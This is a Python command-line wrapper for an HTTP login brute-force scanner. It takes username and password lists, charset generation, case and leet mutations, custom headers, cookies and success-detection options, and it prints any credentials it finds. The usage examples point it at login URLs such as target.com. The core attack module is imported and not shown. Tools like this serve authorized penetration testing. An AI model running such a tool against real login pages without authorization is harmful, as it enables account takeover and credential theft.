#!/usr/bin/env python3
"""
Brute force attack scanner CLI.

Usage:
  python brute_cli.py --url http://localhost/login --usernames admin user --passwords pass123 admin
  python brute_cli.py --url http://target.com/login --username-file users.txt --password-file pass.txt
  python brute_cli.py --request-file login.req --usernames admin --passwords password
"""

import argparse
import json
import os
import sys
from brute import run_bruteforce, WordlistGenerator, BruteForceLogger


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="HTTP login brute force scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack
  python brute_cli.py --url http://localhost/login \\
    --usernames admin user \\
    --passwords password 123456

  # With files
  python brute_cli.py --url http://target.com/login \\
    --username-file users.txt \\
    --password-file passwords.txt

  # With mutations
  python brute_cli.py --url http://localhost/login \\
    --usernames admin \\
    --passwords password \\
    --case-mutations \\
    --leet-mutations \\
    --number-suffix 1 123 !

  # Advanced logging
  python brute_cli.py --url http://localhost/login \\
    --usernames admin \\
    --passwords password \\
    --log-file attack.json \\
    --verbosity 2 \\
    --progress-interval 5
        """
    )
    
    # Target
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--url", help="Target URL")
    target_group.add_argument("--request-file", help="HTTP request file (Burp Suite format)")
    
    # Usernames
    user_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument("--usernames", nargs="+", help="Usernames to try (space-separated)")
    user_group.add_argument("--username-file", help="File with usernames (one per line)")
    
    # Passwords
    pass_group = parser.add_mutually_exclusive_group(required=False)
    pass_group.add_argument("--passwords", nargs="+", help="Passwords to try (space-separated)")
    pass_group.add_argument("--password-file", help="File with passwords (one per line)")
    pass_group.add_argument("--password-charset", choices=[
        "digits", "lower", "upper", "letters", "alphanumeric", "special", "all"
    ], help="Generate passwords from charset")
    
    # Charset generation options
    parser.add_argument("--password-min-length", type=int, default=1,
                       help="Min length for charset generation (default: 1)")
    parser.add_argument("--password-max-length", type=int, default=4,
                       help="Max length for charset generation (default: 4)")
    parser.add_argument("--password-limit", type=int,
                       help="Limit generated passwords (default: unlimited)")
    
    # Prefix/suffix
    parser.add_argument("--username-prefix", default="", help="Prefix for usernames")
    parser.add_argument("--username-suffix", default="", help="Suffix for usernames")
    parser.add_argument("--password-prefix", default="", help="Prefix for passwords")
    parser.add_argument("--password-suffix", default="", help="Suffix for passwords")
    
    # Mutations
    parser.add_argument("--case-mutations", action="store_true",
                       help="Add case mutations (PASS, Pass, pASS)")
    parser.add_argument("--leet-mutations", action="store_true",
                       help="Add leet mutations (p4ss, p@ss)")
    parser.add_argument("--number-suffix", nargs="+", default=[],
                       help="Add number suffixes (e.g., 1 123 2024)")
    
    # Request options
    parser.add_argument("--username-param", default="username",
                       help="Username parameter name (default: username)")
    parser.add_argument("--password-param", default="password",
                       help="Password parameter name (default: password)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET",
                       help="HTTP method (default: GET)")
    parser.add_argument("--data", help="POST data template with {username} and {password}")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[],
                       help="Extra header (repeatable, format: 'Name: Value')")
    
    # Detection
    parser.add_argument("--success-string", help="String indicating successful login")
    parser.add_argument("--failure-string", help="String indicating failed login")
    parser.add_argument("--success-code", type=int, nargs="+",
                       help="HTTP status codes indicating success")
    parser.add_argument("--failure-code", type=int, nargs="+",
                       help="HTTP status codes indicating failure")
    
    # Behavior
    parser.add_argument("--stop-on-success", action="store_true", default=True,
                       help="Stop after first success (default: True)")
    parser.add_argument("--find-all", action="store_true", dest="find_all",
                       help="Continue after finding credentials")
    parser.add_argument("--delay", type=float, default=0,
                       help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("--max-runtime", type=int, default=600,
                       help="Max runtime in seconds (default: 600)")
    
    # Logging
    parser.add_argument("--log-file", help="Log file path")
    parser.add_argument("--log-format", choices=["json", "csv"], default="json",
                       help="Log format (default: json)")
    parser.add_argument("--verbosity", type=int, choices=[0, 1, 2, 3], default=1,
                       help="Verbosity: 0=quiet, 1=normal, 2=verbose, 3=debug")
    parser.add_argument("--progress-interval", type=int, default=10,
                       help="Show progress every N attempts (default: 10)")
    parser.add_argument("--output", "-o", help="Output JSON file")
    
    return parser.parse_args()


def build_headers(header_args):
    """Build headers dict from command-line arguments."""
    headers = {}
    for h in header_args:
        if ":" not in h:
            print(f"[!] Invalid header format: {h} (use 'Name: Value')")
            continue
        name, value = h.split(":", 1)
        headers[name.strip()] = value.strip()
    return headers


def build_wordlist_generator(
    charset=None,
    min_len=1,
    max_len=4,
    limit=None,
    case_mutations=False,
    leet_mutations=False,
    number_suffixes=None,
):
    """Build a WordlistGenerator from options."""
    if charset:
        gen = WordlistGenerator().generate_charset(
            charset=charset,
            min_length=min_len,
            max_length=max_len,
            limit=limit,
        )
    else:
        gen = WordlistGenerator()
    
    if case_mutations:
        gen.add_case_mutations()
    if leet_mutations:
        gen.add_leet_mutations()
    if number_suffixes:
        gen.add_number_suffix(number_suffixes)
    
    return gen


def main():
    args = parse_args()
    
    # Build password generator if needed
    password_generator = None
    if args.password_charset:
        password_generator = build_wordlist_generator(
            charset=args.password_charset,
            min_len=args.password_min_length,
            max_len=args.password_max_length,
            limit=args.password_limit,
            case_mutations=args.case_mutations,
            leet_mutations=args.leet_mutations,
            number_suffixes=args.number_suffix if args.number_suffix else None,
        )
    elif args.case_mutations or args.leet_mutations or args.number_suffix:
        # Apply mutations to default or provided passwords
        password_generator = WordlistGenerator()
        if args.passwords:
            password_generator.add_words(args.passwords)
        elif args.password_file:
            password_generator.load_file(args.password_file)
        else:
            password_generator.add_words(["password", "123456", "admin"])
        
        if args.case_mutations:
            password_generator.add_case_mutations()
        if args.leet_mutations:
            password_generator.add_leet_mutations()
        if args.number_suffix:
            password_generator.add_number_suffix(args.number_suffix)
    
    # Build username generator if mutations are needed
    username_generator = None
    if args.username_prefix or args.username_suffix:
        username_generator = WordlistGenerator()
        if args.usernames:
            username_generator.add_words(args.usernames)
        elif args.username_file:
            username_generator.load_file(args.username_file)
        else:
            username_generator.add_words(["admin", "user", "root"])
        
        username_generator.set_prefix(args.username_prefix)
        username_generator.set_suffix(args.username_suffix)
    
    # Build headers
    headers = build_headers(args.header)
    
    # Determine stop_on_success
    stop_on_success = not args.find_all if args.find_all else args.stop_on_success
    
    # Run brute force
    try:
        result = run_bruteforce(
            url=args.url,
            request_file=args.request_file,
            usernames=args.usernames if not username_generator else None,
            passwords=args.passwords if not password_generator else None,
            username_file=args.username_file if not username_generator else None,
            password_file=args.password_file if not password_generator else None,
            username_generator=username_generator,
            password_generator=password_generator,
            username_prefix=args.username_prefix if not username_generator else "",
            username_suffix=args.username_suffix if not username_generator else "",
            password_prefix=args.password_prefix,
            password_suffix=args.password_suffix,
            username_param=args.username_param,
            password_param=args.password_param,
            method=args.method,
            data=args.data,
            cookie=args.cookie,
            headers=headers,
            success_indicator=args.success_string,
            failure_indicator=args.failure_string,
            success_codes=args.success_code,
            failure_codes=args.failure_code,
            stop_on_success=stop_on_success,
            timeout=args.timeout,
            delay=args.delay,
            max_runtime_seconds=args.max_runtime,
            verbosity=args.verbosity,
            log_file=args.log_file,
            log_format=args.log_format,
            progress_interval=args.progress_interval,
        )
        
        # Output results
        if result.credentials_found:
            print(f"\n[+] SUCCESS! Found {len(result.credentials_found)} credential(s):")
            for cred in result.credentials_found:
                print(f"    {cred['username']}:{cred['password']}")
        else:
            print("\n[-] No credentials found")
        
        # Save output if requested
        if args.output:
            output = {
                "status": "success" if result.credentials_found else "failed",
                "credentials_found": result.credentials_found,
                "stats": result.stats,
            }
            with open(args.output, "w") as f:
                json.dump(output, f, indent=2)
            print(f"\n[*] Results saved to: {args.output}")
        
        # Print statistics
        print(f"\n[*] Statistics:")
        print(f"    Total attempts: {result.stats['total_attempts']}")
        print(f"    Duration: {result.stats['duration_seconds']}s")
        print(f"    Rate: {result.stats['rate_per_second']}/s")
        
        return 0 if result.credentials_found else 1
        
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
